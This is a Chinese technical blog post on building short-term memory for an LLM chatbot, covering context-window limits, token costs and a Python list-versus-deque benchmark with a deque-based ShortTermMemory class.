7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h2 data-id="heading-0"><strong>一、背景：为什么需要记忆系统？</strong></h2>
<p>开发AI Chatbot时，你是否遇到过这些问题：</p>
<ul>
<li>LLM记不住之前的对话，用户体验很差</li>
<li>对话轮数一多，Token成本直线上升</li>
<li>想做长期对话功能，但不知道如何管理上下文</li>
</ul>
<p>这些都是<strong>记忆管理</strong>的问题。本文将从零开始，带你实现一个完整的记忆系统。</p>
<h3 data-id="heading-1"><strong>1.1 问题1：上下文窗口的硬性限制</strong></h3>
<p>先看一组数据：</p>

























<table><thead><tr><th>模型</th><th>上下文窗口</th><th>能支持的对话轮数</th></tr></thead><tbody><tr><td>GPT-3.5</td><td>4K tokens</td><td>~10轮</td></tr><tr><td>GPT-4</td><td>8K tokens</td><td>~20轮</td></tr><tr><td>GPT-4 Turbo</td><td>128K tokens</td><td>~300轮</td></tr></tbody></table>
<p>看起来很多？但实际计算一下：</p>
<pre><code class="hljs">一轮对话（用户问 + AI答）≈ 400 tokens
20轮对话 = 8,000 tokens

GPT-4 的 8K 窗口 = 刚好20轮，就满了
</code></pre>
<p><strong>会发生什么？</strong></p>
<p>当上下文满了之后，LLM会：</p>
<ol>
<li>丢弃最早的对话</li>
<li>忘记用户之前说过的话</li>
<li>对话失去连贯性</li>
</ol>

<pre><code class="hljs language-python" lang="python">用户：<span class="hljs-string">"我叫Tom"</span>（第<span class="hljs-number">1</span>轮）
<span class="hljs-meta">... </span>对话了<span class="hljs-number">20</span>轮 ...
用户：<span class="hljs-string">"我叫什么名字？"</span>（第<span class="hljs-number">21</span>轮）
AI：<span class="hljs-string">"抱歉，我不记得"</span> ❌
</code></pre>
<p>即使用更大窗口的模型，也只是延缓问题，无法根本解决。</p>
<h3 data-id="heading-2"><strong>1.2 问题2：Token成本持续增长</strong></h3>
<p>Token不仅有数量限制，还有<strong>成本问题</strong>。</p>
<p>以DeepSeek为例（$0.14/1M tokens），算一笔账：</p>
<pre><code class="hljs language-ini" lang="ini">场景：客服机器人，日活10万用户

每次对话：
- 历史对话50轮 = 20,000 tokens
- 新用户输入 = 200 tokens
- 总计 = 20,200 tokens

成本计算：
- 单次对话成本 = 20,200 * $0.14 / <span class="hljs-attr">1M</span> = <span class="hljs-variable">$0</span>.<span class="hljs-number">003</span>
- 日成本 = 10万用户 * $<span class="hljs-attr">0.003</span> = <span class="hljs-variable">$300</span>
- 月成本 = $300 * <span class="hljs-attr">30</span> = <span class="hljs-variable">$9</span>,<span class="hljs-number">000</span>
</code></pre>
<p><strong>如果能压缩70%？</strong></p>
<pre><code class="hljs language-bash" lang="bash">压缩后每次 = 6,000 tokens
月成本 = <span class="hljs-variable">$2</span>,700
节省 = <span class="hljs-variable">$6</span>,300/月 = <span class="hljs-variable">$75</span>,600/年 ✅
</code></pre>
<p>这还只是输入成本，输出成本会更高！</p>
<h3 data-id="heading-3"><strong>1.3 问题3：用户期望的"记忆"能力</strong></h3>
<p>从产品角度看，用户期望AI能：</p>
<ul>
<li>记住自己的名字、偏好、背景</li>
<li>延续之前的对话话题</li>
<li>不用每次都重复信息</li>
</ul>
<p><strong>没有记忆 vs 有记忆：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">❌ 无记忆：
用户：<span class="hljs-string">"我昨天说过我喜欢吃辣的"</span>
AI：<span class="hljs-string">"抱歉，我不记得"</span>
用户：（关闭页面）

✅ 有记忆：
用户：<span class="hljs-string">"推荐个餐厅"</span>
AI：<span class="hljs-string">"Tom，根据你喜欢吃辣的口味，推荐你试试..."</span>
用户：（继续使用）
</code></pre>
<p>记忆能力是AI产品的核心竞争力。</p>
<h3 data-id="heading-4"><strong>1.4 解决方案：记忆系统</strong></h3>
<p>一个完整的记忆系统需要解决：</p>
<ol>
<li><strong>存什么</strong>：如何筛选和保存重要信息？</li>
<li><strong>怎么存</strong>：如何高效存储和检索？</li>
<li><strong>如何压缩</strong>：如何在有限窗口内保留最多信息？</li>
</ol>
<p>本文将实现一个完整的记忆系统，包括：</p>
<ul>
<li>✅ 短期记忆（内存，极速访问）</li>
<li>✅ 4种压缩策略（对比分析）</li>
<li>✅ 性能测试（真实数据）</li>
<li>✅ 中期记忆架构设计（Redis + PostgreSQL）</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc46b627b5444c9baea672b66336a386~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=H7QCZBCq2at7ExBCwc3nM0be4%2FA%3D" alt="image.png" loading="lazy"/></p>
<p>完整代码已开源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot.git" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot.git" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<p>让我们开始吧。</p>
<p>完美！让我根据你的选择起草第二部分：</p>
<hr/>
<h2 data-id="heading-5"><strong>二、短期记忆实现</strong></h2>
<h3 data-id="heading-6"><strong>2.1 核心问题：如何存储最近N轮对话？</strong></h3>
<p>在实现记忆系统时，第一个要解决的问题是：<strong>如何高效地存储和管理最近的对话历史？</strong></p>
<p>需求很简单：</p>
<ul>
<li>保存最近10轮（20条消息）</li>
<li>超过限制后，自动删除最早的消息</li>
<li>读写速度要快（&lt;1ms）</li>
</ul>
<p>看起来很简单？让我们先看看常见的两种方案。</p>
<h3 data-id="heading-7"><strong>2.2 技术选型：List vs Deque</strong></h3>
<h4 data-id="heading-8"><strong>方案1：使用List</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryWithList</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_messages=<span class="hljs-number">20</span></span>):
        self.max_messages = max_messages
        self.messages = []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_message</span>(<span class="hljs-params">self, role, content</span>):
        self.messages.append({<span class="hljs-string">"role"</span>: role, <span class="hljs-string">"content"</span>: content})
        
        <span class="hljs-comment"># 手动删除最早的消息</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.messages) &gt; self.max_messages:
            self.messages = self.messages[-self.max_messages:]
</code></pre>
<p><strong>问题：</strong></p>
<ul>
<li>❌ 每次都要切片重新赋值（<code>messages[-20:]</code>）</li>
<li>❌ 切片操作会创建新列表，浪费内存</li>
<li>❌ 时间复杂度 O(n)</li>
</ul>
<h4 data-id="heading-9"><strong>方案2：使用Deque</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryWithDeque</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_messages=<span class="hljs-number">20</span></span>):
        self.messages = deque(maxlen=max_messages)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_message</span>(<span class="hljs-params">self, role, content</span>):
        self.messages.append({<span class="hljs-string">"role"</span>: role, <span class="hljs-string">"content"</span>: content})
        <span class="hljs-comment"># 自动删除！无需手动管理</span>
</code></pre>
<p><strong>优势：</strong></p>
<ul>
<li>✅ 自动管理容量，无需手动删除</li>
<li>✅ 时间复杂度 O(1)</li>
<li>✅ 代码更简洁</li>
</ul>
<h4 data-id="heading-10"><strong>性能对比</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
List vs Deque 性能对比测试

测试场景：
1. 连续添加消息
2. 满容量后继续添加
3. 获取所有消息
4. 混合操作
"""</span>

<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>


<span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryWithList</span>:
    <span class="hljs-string">"""使用List实现的记忆"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_messages: <span class="hljs-built_in">int</span> = <span class="hljs-number">20</span></span>):
        self.max_messages = max_messages
        self.messages = []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_message</span>(<span class="hljs-params">self, role: <span class="hljs-built_in">str</span>, content: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:
        self.messages.append({<span class="hljs-string">"role"</span>: role, <span class="hljs-string">"content"</span>: content})
        
        <span class="hljs-comment"># 手动删除超出的消息</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.messages) &gt; self.max_messages:
            self.messages = self.messages[-self.max_messages:]
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_messages</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]:
        <span class="hljs-keyword">return</span> self.messages.copy()


<span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryWithDeque</span>:
    <span class="hljs-string">"""使用Deque实现的记忆"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_messages: <span class="hljs-built_in">int</span> = <span class="hljs-number">20</span></span>):
        self.messages = deque(maxlen=max_messages)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_message</span>(<span class="hljs-params">self, role: <span class="hljs-built_in">str</span>, content: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:
        self.messages.append({<span class="hljs-string">"role"</span>: role, <span class="hljs-string">"content"</span>: content})
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_messages</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]:
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(self.messages)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_continuous_add</span>(<span class="hljs-params">memory_class, n: <span class="hljs-built_in">int</span> = <span class="hljs-number">1000</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-string">"""
    测试1：连续添加消息
    
    Args:
        memory_class: 内存类
        n: 添加次数
    
    Returns:
        耗时（毫秒）
    """</span>
    memory = memory_class(max_messages=<span class="hljs-number">20</span>)
    
    start = time.time()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
        memory.add_message(<span class="hljs-string">"user"</span>, <span class="hljs-string">f"消息 <span class="hljs-subst">{i}</span>"</span>)
    elapsed = (time.time() - start) * <span class="hljs-number">1000</span>
    
    <span class="hljs-keyword">return</span> elapsed


<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_add_at_full_capacity</span>(<span class="hljs-params">memory_class, n: <span class="hljs-built_in">int</span> = <span class="hljs-number">1000</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-string">"""
    测试2：满容量后继续添加
    
    场景：已经有20条消息，继续添加n条
    这是最常见的场景（对话超过限制后）
    
    Returns:
        耗时（毫秒）
    """</span>
    memory = memory_class(max_messages=<span class="hljs-number">20</span>)
    
    <span class="hljs-comment"># 先填满</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):
        memory.add_message(<span class="hljs-string">"user"</span>, <span class="hljs-string">f"初始消息 <span class="hljs-subst">{i}</span>"</span>)
    
    <span class="hljs-comment"># 测试满容量后的添加</span>
    start = time.time()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
        memory.add_message(<span class="hljs-string">"user"</span>, <span class="hljs-string">f"新消息 <span class="hljs-subst">{i}</span>"</span>)
    elapsed = (time.time() - start) * <span class="hljs-number">1000</span>
    
    <span class="hljs-keyword">return</span> elapsed


<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_get_messages</span>(<span class="hljs-params">memory_class, n: <span class="hljs-built_in">int</span> = <span class="hljs-number">1000</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-string">"""
    测试3：获取消息
    
    Returns:
        耗时（毫秒）
    """</span>
    memory = memory_class(max_messages=<span class="hljs-number">20</span>)
    
    <span class="hljs-comment"># 先添加20条消息</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):
        memory.add_message(<span class="hljs-string">"user"</span>, <span class="hljs-string">f"消息 <span class="hljs-subst">{i}</span>"</span>)
    
    <span class="hljs-comment"># 测试获取消息的速度</span>
    start = time.time()
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
        messages = memory.get_messages()
    elapsed = (time.time() - start) * <span class="hljs-number">1000</span>
    
    <span class="hljs-keyword">return</span> elapsed


<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_mixed_operations</span>(<span class="hljs-params">memory_class, n: <span class="hljs-built_in">int</span> = <span class="hljs-number">1000</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-string">"""
    测试4：混合操作
    
    模拟真实对话场景：
    - 添加用户消息
    - 获取历史
    - 添加AI回复
    - 再次获取历史
    
    Returns:
        耗时（毫秒）
    """</span>
    memory = memory_class(max_messages=<span class="hljs-number">20</span>)
    
    start = time.time()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
        <span class="hljs-comment"># 用户输入</span>
        memory.add_message(<span class="hljs-string">"user"</span>, <span class="hljs-string">f"用户问题 <span class="hljs-subst">{i}</span>"</span>)
        <span class="hljs-comment"># 构建上下文（需要获取历史）</span>
        history = memory.get_messages()
        <span class="hljs-comment"># AI回复</span>
        memory.add_message(<span class="hljs-string">"assistant"</span>, <span class="hljs-string">f"AI回答 <span class="hljs-subst">{i}</span>"</span>)
    elapsed = (time.time() - start) * <span class="hljs-number">1000</span>
    
    <span class="hljs-keyword">return</span> elapsed


<span class="hljs-keyword">def</span> <span class="hljs-title function_">run_all_tests</span>():
    <span class="hljs-string">"""运行所有测试 - 增加测试规模"""</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">80</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"List vs Deque 性能对比测试（大规模）"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">80</span>)
    <span class="hljs-built_in">print</span>()
    
    <span class="hljs-comment"># 增加测试规模</span>
    test_configs = [
        (<span class="hljs-string">"连续添加10000条消息"</span>, test_continuous_add, <span class="hljs-number">10000</span>),
        (<span class="hljs-string">"满容量后添加10000条"</span>, test_add_at_full_capacity, <span class="hljs-number">10000</span>),
        (<span class="hljs-string">"获取消息10000次"</span>, test_get_messages, <span class="hljs-number">10000</span>),
        (<span class="hljs-string">"混合操作10000次"</span>, test_mixed_operations, <span class="hljs-number">10000</span>),
        
        <span class="hljs-comment"># 添加超大规模测试</span>
        (<span class="hljs-string">"连续添加100000条消息"</span>, test_continuous_add, <span class="hljs-number">100000</span>),
        (<span class="hljs-string">"满容量后添加100000条"</span>, test_add_at_full_capacity, <span class="hljs-number">100000</span>),
    ]
    
    results = []
    
    <span class="hljs-keyword">for</span> test_name, test_func, n <span class="hljs-keyword">in</span> test_configs:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"测试场景: <span class="hljs-subst">{test_name}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">80</span>)
        
        <span class="hljs-comment"># 测试List</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  测试List..."</span>, end=<span class="hljs-string">" "</span>, flush=<span class="hljs-literal">True</span>)
        list_time = test_func(MemoryWithList, n)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✓ <span class="hljs-subst">{list_time:<span class="hljs-number">.2</span>f}</span>ms"</span>)
        
        <span class="hljs-comment"># 测试Deque</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  测试Deque..."</span>, end=<span class="hljs-string">" "</span>, flush=<span class="hljs-literal">True</span>)
        deque_time = test_func(MemoryWithDeque, n)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✓ <span class="hljs-subst">{deque_time:<span class="hljs-number">.2</span>f}</span>ms"</span>)
        
        <span class="hljs-comment"># 计算倍数</span>
        speedup = list_time / deque_time <span class="hljs-keyword">if</span> deque_time &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
        winner = <span class="hljs-string">"Deque"</span> <span class="hljs-keyword">if</span> speedup &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"List"</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  → <span class="hljs-subst">{winner}</span>快 <span class="hljs-subst">{<span class="hljs-built_in">abs</span>(speedup):<span class="hljs-number">.1</span>f}</span>x"</span>)
        <span class="hljs-built_in">print</span>()
        
        results.append({
            <span class="hljs-string">"test"</span>: test_name,
            <span class="hljs-string">"list"</span>: list_time,
            <span class="hljs-string">"deque"</span>: deque_time,
            <span class="hljs-string">"speedup"</span>: speedup
        })
    
    <span class="hljs-comment"># 打印总结</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">80</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"测试总结"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">80</span>)
    <span class="hljs-built_in">print</span>()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-string">'测试场景'</span>:&lt;<span class="hljs-number">30</span>}</span> <span class="hljs-subst">{<span class="hljs-string">'List(ms)'</span>:&lt;<span class="hljs-number">12</span>}</span> <span class="hljs-subst">{<span class="hljs-string">'Deque(ms)'</span>:&lt;<span class="hljs-number">12</span>}</span> <span class="hljs-subst">{<span class="hljs-string">'速度对比'</span>:&lt;<span class="hljs-number">10</span>}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">80</span>)
    
    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results:
        winner = <span class="hljs-string">"🟢 Deque"</span> <span class="hljs-keyword">if</span> r[<span class="hljs-string">'speedup'</span>] &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"🔴 List"</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{r[<span class="hljs-string">'test'</span>]:&lt;<span class="hljs-number">30</span>}</span> <span class="hljs-subst">{r[<span class="hljs-string">'list'</span>]:&lt;<span class="hljs-number">12.2</span>f}</span> <span class="hljs-subst">{r[<span class="hljs-string">'deque'</span>]:&lt;<span class="hljs-number">12.2</span>f}</span> <span class="hljs-subst">{winner}</span> <span class="hljs-subst">{<span class="hljs-built_in">abs</span>(r[<span class="hljs-string">'speedup'</span>]):<span class="hljs-number">.1</span>f}</span>x"</span>)
    
    <span class="hljs-built_in">print</span>()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">80</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"关键结论:"</span>)
    
    <span class="hljs-comment"># 找出最大差异</span>
    max_speedup = <span class="hljs-built_in">max</span>(results, key=<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">abs</span>(x[<span class="hljs-string">'speedup'</span>] - <span class="hljs-number">1</span>))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  最大差异: <span class="hljs-subst">{max_speedup[<span class="hljs-string">'test'</span>]}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  → Deque快 <span class="hljs-subst">{max_speedup[<span class="hljs-string">'speedup'</span>]:<span class="hljs-number">.1</span>f}</span>x"</span>)
    
    <span class="hljs-comment"># 计算在添加场景下的平均提升</span>
    add_tests = [r <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results <span class="hljs-keyword">if</span> <span class="hljs-string">'添加'</span> <span class="hljs-keyword">in</span> r[<span class="hljs-string">'test'</span>]]
    avg_add_speedup = <span class="hljs-built_in">sum</span>(r[<span class="hljs-string">'speedup'</span>] <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> add_tests) / <span class="hljs-built_in">len</span>(add_tests)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  添加操作平均: Deque快 <span class="hljs-subst">{avg_add_speedup:<span class="hljs-number">.1</span>f}</span>x"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">80</span>)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    run_all_tests()
</code></pre>
<h4 data-id="heading-11"><strong>测试1：添加操作（核心场景）</strong></h4>























<table><thead><tr><th>规模</th><th>List</th><th>Deque</th><th>提升</th></tr></thead><tbody><tr><td>10,000次</td><td>6.13ms</td><td>3.28ms</td><td><strong>1.9x</strong></td></tr><tr><td>100,000次</td><td>36.19ms</td><td>17.72ms</td><td><strong>2.0x</strong></td></tr></tbody></table>
<p><strong>发现：规模越大，Deque优势越明显。在10万次操作时，Deque快2倍。</strong></p>
<h4 data-id="heading-12"><strong>测试2：混合操作（意外发现）</strong></h4>
<pre><code class="hljs language-diff" lang="diff">混合操作（添加+获取）10000次：
<span class="hljs-deletion">- List:  44.12ms  ✅</span>
<span class="hljs-deletion">- Deque: 125.34ms ❌</span>

什么？List反而更快？
</code></pre>
<p><strong>原因：<code>list(deque)</code>的转换开销很大</strong></p>
<p>每次调用<code>get_messages()</code>时，Deque需要转换成List：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_messages</span>(<span class="hljs-params">self</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(self.messages)  <span class="hljs-comment"># ⚠️ 每次都创建新list</span>
</code></pre>
<p>这给我们一个重要启示：<strong>不要频繁转换！</strong></p>
<h4 data-id="heading-13"><strong>优化方案</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ShortTermMemory</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_messages</span>(<span class="hljs-params">self</span>) -&gt; deque:
        <span class="hljs-comment"># 直接返回deque，不转换</span>
        <span class="hljs-keyword">return</span> self.messages
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">self, user_input</span>):
        <span class="hljs-comment"># 只在真正需要list时才转换</span>
        context = [system_prompt] + <span class="hljs-built_in">list</span>(self.memory.get_messages())
        <span class="hljs-comment"># 这样只转换一次，而不是每次操作都转换</span>
</code></pre>
<h4 data-id="heading-14"><strong>最终性能对比</strong></h4>
<p>在<strong>典型对话场景</strong>（满容量后继续添加）：</p>
<pre><code class="hljs language-markdown" lang="markdown">10万次操作：
<span class="hljs-bullet">-</span> List:  36.19ms
<span class="hljs-bullet">-</span> Deque: 17.72ms
<span class="hljs-bullet">-</span> Deque快 2.0x ✅

关键：Deque在核心场景（添加）快2倍，
<span class="hljs-code">     只要减少不必要的list转换即可。
</span></code></pre>
<h4 data-id="heading-15"><strong>为什么选Deque？</strong></h4>
<ol>
<li><strong>代码简洁</strong></li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># List需要手动管理</span>
<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(messages) &gt; max_messages:
    messages = messages[-max_messages:]

<span class="hljs-comment"># Deque自动管理</span>
<span class="hljs-comment"># 什么都不用做 ✅</span>
</code></pre>
<ol start="2">
<li><strong>性能更好</strong>（在核心场景）</li>
</ol>
<ul>
<li>添加操作：快 2.0x</li>
<li>只要优化转换，没有劣势</li>
</ul>
<ol start="3">
<li><strong>时间复杂度保证</strong></li>
</ol>
<ul>
<li>List切片：O(n)</li>
<li>Deque添加：O(1)</li>
</ul>
<p><strong>结论：选Deque，优化list转换，最佳实践。</strong></p>
<p>完整测试代码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Ftests%2Ftest_list_vs_deque.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/tests/test_list_vs_deque.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<h3 data-id="heading-16"><strong>2.3 生产级实现</strong></h3>
<p>基于deque，我们实现一个完整的短期记忆管理类：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ShortTermMemory</span>:
    <span class="hljs-string">"""
    短期记忆管理器
    
    特点：
    - 自动管理容量（基于deque）
    - 极速读写（&lt;1ms）
    - 按轮数管理（1轮 = user + assistant）
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_turns: <span class="hljs-built_in">int</span> = <span class="hljs-number">10</span></span>):
        <span class="hljs-string">"""
        Args:
            max_turns: 最大轮数（默认10轮 = 20条消息）
        """</span>
        self.max_turns = max_turns
        self.max_messages = max_turns * <span class="hljs-number">2</span>
        self.messages: deque = deque(maxlen=self.max_messages)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_message</span>(<span class="hljs-params">self, role: <span class="hljs-built_in">str</span>, content: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""添加一条消息"""</span>
        self.messages.append({
            <span class="hljs-string">"role"</span>: role,
            <span class="hljs-string">"content"</span>: content
        })
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_messages</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]:
        <span class="hljs-string">"""获取所有消息"""</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(self.messages)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">clear</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""清空记忆"""</span>
        self.messages.clear()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_turn_count</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:
        <span class="hljs-string">"""获取当前轮数"""</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(self.messages) // <span class="hljs-number">2</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_full</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bool</span>:
        <span class="hljs-string">"""判断是否已满"""</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(self.messages) &gt;= self.max_messages
</code></pre>
<p><strong>关键设计：</strong></p>
<ul>
<li>按<strong>轮数</strong>而非消息数管理（更符合对话逻辑）</li>
<li><code>maxlen</code>参数让deque自动删除（无需手动管理）</li>
<li>提供<code>is_full()</code>等辅助方法（方便后续压缩策略判断）</li>
</ul>
